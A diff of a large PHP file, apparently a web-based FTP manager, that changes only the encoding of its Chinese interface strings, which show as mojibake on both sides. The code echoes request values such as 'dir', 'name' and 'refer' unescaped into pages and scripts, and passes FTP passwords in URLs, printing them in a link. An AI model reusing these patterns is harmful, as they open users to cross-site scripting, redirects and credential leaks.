                                 <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.download")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444"><?php echo $split[8];?></a></td>
                                 <td align="center"><?php echo $split[1]."-".$split[2]."-".$split[3]." ".$split[4].":".$split[5].$split[6];?></td>
-                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#444444">¸ÄÃû</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">É¾³ı</a> Ñ¹Ëõ</td>
+                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#444444">æ”¹å</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">åˆ é™¤</a> å‹ç¼©</td>
                         </tr>
                         <?php 
                                         $cMaxFile = $cMaxFile + 1;
@@ -6206,7 +7834,7 @@ function encodeuri(str){
                 <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                         <tr class="tdbg"> 
                                 <td height="21" colspan="5" align="center">
-                                        ¹² <?php echo $cMaxDir;?> ¸öÄ¿Â¼£¬<?php echo ($cMaxFile-$cMaxDir);?> ¸öÎÄ¼ş 
+                                        å…± <?php echo $cMaxDir;?> ä¸ªç›®å½•ï¼Œ<?php echo ($cMaxFile-$cMaxDir);?> ä¸ªæ–‡ä»¶ 
                                 </td>
                         </tr>
                 </table>
@@ -6224,11 +7852,11 @@ function encodeuri(str){
                         ?>
                         <tr class="tdbg" width="30%">
                                 <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
-                                <td align="center" width="7%">ÀàĞÍ</td>
-                                <td align="center">Ãû³Æ</td>
-                                <td align="center" width="10%">´óĞ¡</td>
-                                <td align="center" width="15%">ĞŞ¸ÄÊ±¼ä</td>
-                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">ĞÂ½¨</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444;">ÉÏ´«</a> <a style="color:#444444" href="javascript:delitem();">É¾³ı</a> Ñ¹Ëõ ½âÑ¹</td>
+                                <td align="center" width="7%">ç±»å‹</td>
+                                <td align="center">åç§°</td>
+                                <td align="center" width="10%">å¤§å°</td>
+                                <td align="center" width="15%">ä¿®æ”¹æ—¶é—´</td>
+                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">æ–°å»º</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444;">ä¸Šä¼ </a> <a style="color:#444444" href="javascript:delitem();">åˆ é™¤</a> å‹ç¼© è§£å‹</td>
                         </tr>
                         <?php 
                         $cMaxDir = 0;
@@ -6240,7 +7868,7 @@ function encodeuri(str){
                         ?>
                         <tr class="tdbg">
                                 <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $split[8];?>"></td>
-                                <td align="center">Ä¿Â¼</td>
+                                <td align="center">ç›®å½•</td>
                                 <?php 
                                 if ($split[8] == "."){
                                 ?>
@@ -6260,7 +7888,7 @@ function encodeuri(str){
                                 ?>      
                                 <td align="center"><?php echo $split[5];?></td>
                                 <td align="center"><?php echo $split[6]." ".$split[7];?></td>
-                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#444444">¸ÄÃû</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">É¾³ı</a> Ñ¹Ëõ</td>
+                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#444444">æ”¹å</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">åˆ é™¤</a> å‹ç¼©</td>
                         </tr>
                         <?php 
                                         $cMaxDir = $cMaxDir + 1;
@@ -6275,11 +7903,11 @@ function encodeuri(str){
                         ?>
                         <tr class="tdbg">
                                 <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxFile;?>" id="chidd<?php echo $cMaxFile;?>" value="<?php echo $split[8];?>"></td>
-                                <td align="center">ÎÄ¼ş</td>
+                                <td align="center">æ–‡ä»¶</td>
                                 <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.download")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444"><?php echo $split[8];?></a></td>
                                 <td align="center"><?php echo $split[5];?></td>
                                 <td align="center"><?php echo $split[6]." ".$split[7];?></td>
-                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#444444">¸ÄÃû</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">É¾³ı</a> Ñ¹Ëõ</td>
+                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#444444">æ”¹å</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">åˆ é™¤</a> å‹ç¼©</td>
                         </tr>
                         <?php 
                                         $cMaxFile = $cMaxFile + 1;
@@ -6291,7 +7919,7 @@ function encodeuri(str){
                 <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                         <tr class="tdbg"> 
                                 <td height="21" colspan="5" align="center">
-                                        ¹² <?php echo $cMaxDir;?> ¸öÄ¿Â¼£¬<?php echo ($cMaxFile-$cMaxDir);?> ¸öÎÄ¼ş 
+                                        å…± <?php echo $cMaxDir;?> ä¸ªç›®å½•ï¼Œ<?php echo ($cMaxFile-$cMaxDir);?> ä¸ªæ–‡ä»¶ 
                                 </td>
                         </tr>
                 </table>
@@ -6314,13 +7942,13 @@ function encodeuri(str){
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result">
-											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>È·ÈÏ</a>
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>È¡Ïû</a>
+											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>ç¡®è®¤</a>
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>å–æ¶ˆ</a>
                 </td>
         </tr>  
 </table> 
@@ -6330,11 +7958,11 @@ function encodeuri(str){
 									else{
 				?>
         <script language="javascript">
-                if(confirm('È·¶¨É¾³ıÑ¡ÖĞµÄ<?php if(trim(request("type"))=='file'){echo 'ÎÄ¼ş';}elseif(trim(request("type"))=='dir'){echo 'Ä¿Â¼';}?>?') == true){
+                if(confirm('ç¡®å®šåˆ é™¤é€‰ä¸­çš„<?php if(trim(request("type"))=='file'){echo 'æ–‡ä»¶';}elseif(trim(request("type"))=='dir'){echo 'ç›®å½•';}?>?') == true){
                         window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";
                 }       
                 else{   
-                        alert("¸Ã<?php if(trim(request("type"))=='file'){echo 'ÎÄ¼ş';}elseif(trim(request("type"))=='dir'){echo 'Ä¿Â¼';}?>É¾³ıÈ¡Ïû£¡");
+                        alert("è¯¥<?php if(trim(request("type"))=='file'){echo 'æ–‡ä»¶';}elseif(trim(request("type"))=='dir'){echo 'ç›®å½•';}?>åˆ é™¤å–æ¶ˆï¼");
                         history.go(-1);
                 }       
         </script>
@@ -6346,7 +7974,7 @@ function encodeuri(str){
                         $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                         $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                         if ((!$conn_id) || (!$login_result)) {
-                                AlertBack("FTPµÇÂ½Ê§°Ü£¡" , 1);
+                                AlertBack("FTPç™»é™†å¤±è´¥ï¼" , 1);
                         }  
                         $contents = ftp_rawlist($conn_id, trim(request("dir")));
                         if (ftp_systype($conn_id) == "Windows_NT"){
@@ -6371,7 +7999,7 @@ function encodeuri(str){
                                 if ($flag == "1"){
                                 }
                                 else{
-                                        AlertBack("¸ÃÎÄ¼ş»òÄ¿Â¼²»´æÔÚ£¡" , 2);
+                                        AlertBack("è¯¥æ–‡ä»¶æˆ–ç›®å½•ä¸å­˜åœ¨ï¼" , 2);
                                         return;
                                 }
                         }
@@ -6396,7 +8024,7 @@ function encodeuri(str){
                                 if ($flag == "1"){
                                 }
                                 else{
-                                        AlertBack("¸ÃÎÄ¼ş»òÄ¿Â¼²»´æÔÚ£¡" , 2);
+                                        AlertBack("è¯¥æ–‡ä»¶æˆ–ç›®å½•ä¸å­˜åœ¨ï¼" , 2);
                                         return;
                                 }
                         }
@@ -6413,7 +8041,7 @@ function encodeuri(str){
                         $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                         $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                         if ((!$conn_id) || (!$login_result)) {
-                                AlertBack("FTPµÇÂ½Ê§°Ü£¡" , 1);
+                                AlertBack("FTPç™»é™†å¤±è´¥ï¼" , 1);
                         }  
                         $contents = ftp_rawlist($conn_id, trim(request("dir")));
                         $delcount = "0";
@@ -6475,19 +8103,19 @@ function encodeuri(str){
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
                         <?php 
                         if (trim(request("type")) != ""){
                         ?>
-                                <?php if (trim(request("type")) == "file"){?>ÎÄ¼ş<?php }?><?php if (trim(request("type")) == "dir"){?>Ä¿Â¼<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> É¾³ı³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                                <?php if (trim(request("type")) == "file"){?>æ–‡ä»¶<?php }?><?php if (trim(request("type")) == "dir"){?>ç›®å½•<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> åˆ é™¤æˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                         <?php 
                         }
                         elseif (trim(request("type")) == ""){
                         ?>
-                                <?php echo $delcount;?> ¸öÎÄ¼ş»òÄ¿Â¼É¾³ı³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                                <?php echo $delcount;?> ä¸ªæ–‡ä»¶æˆ–ç›®å½•åˆ é™¤æˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                         <?php 
                         }
                         ?>
@@ -6504,19 +8132,19 @@ function encodeuri(str){
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
                 <?php 
                 if (trim(request("type")) != ""){
                 ?>
-                        <?php if (trim(request("type")) == "file"){?>ÎÄ¼ş<?php }?><?php if (trim(request("type")) == "dir"){?>Ä¿Â¼<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> É¾³ıÊ§°Ü£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                        <?php if (trim(request("type")) == "file"){?>æ–‡ä»¶<?php }?><?php if (trim(request("type")) == "dir"){?>ç›®å½•<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> åˆ é™¤å¤±è´¥ï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 <?php 
                 }
                 elseif (trim(request("type")) == ""){
                 ?>
-                        ÎÄ¼ş»òÄ¿Â¼É¾³ıÊ§°Ü£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                        æ–‡ä»¶æˆ–ç›®å½•åˆ é™¤å¤±è´¥ï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 <?php 
                 }
                 ?>              
@@ -6533,19 +8161,19 @@ function encodeuri(str){
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
                 <?php 
                 if (trim(request("type")) != ""){
                 ?>
-                        <?php if (trim(request("type")) == "file"){?>ÎÄ¼ş<?php }?><?php if (trim(request("type")) == "dir"){?>Ä¿Â¼<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> É¾³ıÎ´³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                        <?php if (trim(request("type")) == "file"){?>æ–‡ä»¶<?php }?><?php if (trim(request("type")) == "dir"){?>ç›®å½•<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> åˆ é™¤æœªæˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 <?php 
                 }
                 elseif (trim(request("type")) == ""){
                 ?>
-                        ÎÄ¼ş»òÄ¿Â¼É¾³ıÎ´³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                        æ–‡ä»¶æˆ–ç›®å½•åˆ é™¤æœªæˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 <?php 
                 }
                 ?>              
@@ -6562,7 +8190,7 @@ function encodeuri(str){
                 $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                 $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                 if ((!$conn_id) || (!$login_result)) {
-                    AlertBack("FTPµÇÂ½Ê§°Ü£¡" , 1);
+                    AlertBack("FTPç™»é™†å¤±è´¥ï¼" , 1);
                 }
                 $contents = ftp_rawlist($conn_id, "/");
                 //print_r($contents);
@@ -6570,7 +8198,7 @@ function encodeuri(str){
                         foreach ($contents as $current){ 
                                 ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                 if (trim(request("to")) == $split[8]){
-                                        AlertBack("ÒÑ¾­´æÔÚ¸ÃÎÄ¼ş»òÄ¿Â¼Ãû£¡" , 1);
+                                        AlertBack("å·²ç»å­˜åœ¨è¯¥æ–‡ä»¶æˆ–ç›®å½•åï¼" , 1);
                                         break;
                                         return; 
                                 }
@@ -6582,7 +8210,7 @@ function encodeuri(str){
                         foreach ($contents as $current){ 
                                 ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                 if (trim(request("to")) == $split[8]){
-                                        AlertBack("ÒÑ¾­´æÔÚ¸ÃÎÄ¼ş»òÄ¿Â¼Ãû£¡" , 1);
+                                        AlertBack("å·²ç»å­˜åœ¨è¯¥æ–‡ä»¶æˆ–ç›®å½•åï¼" , 1);
                                         break;
                                         return; 
                                 }
@@ -6597,11 +8225,11 @@ function encodeuri(str){
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÎÄ¼ş»òÄ¿Â¼ÖØÃüÃû³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                æ–‡ä»¶æˆ–ç›®å½•é‡å‘½åæˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -6615,11 +8243,11 @@ function encodeuri(str){
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÎÄ¼ş»òÄ¿Â¼ÖØÃüÃûÊ§°Ü£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                æ–‡ä»¶æˆ–ç›®å½•é‡å‘½åå¤±è´¥ï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -6640,17 +8268,17 @@ function changeimg()
 </script>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left">&nbsp;FTP¹ÜÀí -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("dir"));?></a></td>
+                <td align="left">&nbsp;FTPç®¡ç† -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("dir"));?></a></td>
         </tr>
 </table>
 <table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg" height="40">
                 <td align="center">
                         <form enctype="multipart/form-data" action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor."&server=".encodeuri(trim(request("server")))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&port=".trim(request("port"));?>&action=<?php echo encodeuri("ftp.create");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>&refer=<?php echo encodeuri(trim(request("refer")));?>" method="POST" name="ftp">
-                        &nbspÃû³Æ£º<input type="text" class="text" name="name" value="" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        Ä¿Â¼<input type="radio" name="type" value="dir" checked>
+                        &nbspåç§°ï¼š<input type="text" class="text" name="name" value="" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        ç›®å½•<input type="radio" name="type" value="dir" checked>
                         <noscript>
-                        ÎÄ¼ş<input type="radio" name="type" value="file" >
+                        æ–‡ä»¶<input type="radio" name="type" value="file" >
                         </noscript>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
@@ -6661,21 +8289,21 @@ function changeimg()
         case "ftp.create":
                 if (trim(request("name")) == ""){
                         if (trim($_POST["name"]) == ""){
-                                AlertBack("ÎÄ¼ş»òÄ¿Â¼ÃûÎª¿Õ" , 1);
+                                AlertBack("æ–‡ä»¶æˆ–ç›®å½•åä¸ºç©º" , 1);
                                 break;
                         }
                         else{
-                                AlertBack("ÎÄ¼ş»òÄ¿Â¼ÃûÎª¿Õ£¡" , 2);
+                                AlertBack("æ–‡ä»¶æˆ–ç›®å½•åä¸ºç©ºï¼" , 2);
                                 break;
                         }
                 }
                 If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                         if (trim(request("checkcode")) != ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                 break;
                         }       
                         elseif (trim(request("checkcode")) == ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                 break;
                         }               
                 }  
@@ -6686,7 +8314,7 @@ function changeimg()
                 $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                 $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                 if ((!$conn_id) || (!$login_result)) {
-                    AlertBack("FTPµÇÂ½Ê§°Ü£¡" , 1);
+                    AlertBack("FTPç™»é™†å¤±è´¥ï¼" , 1);
                 }
                 if (trim(request("type")) == "dir"){
                         $msg = @ftp_mkdir($conn_id,trim(request("dir"))."/".trim(request("name")));
@@ -6699,19 +8327,19 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
                 <?php 
                 if (trim(request("type")) == "dir"){
                 ?>
-                        Ä¿Â¼ <?php echo trim(request("name"));?> ´´½¨³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³   
+                        ç›®å½• <?php echo trim(request("name"));?> åˆ›å»ºæˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ   
                 <?php                       
                 }
                 elseif (trim(request("type")) == "dir"){
                 ?>
-                        ÎÄ¼ş <?php echo trim(request("name"));?> ´´½¨³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³   
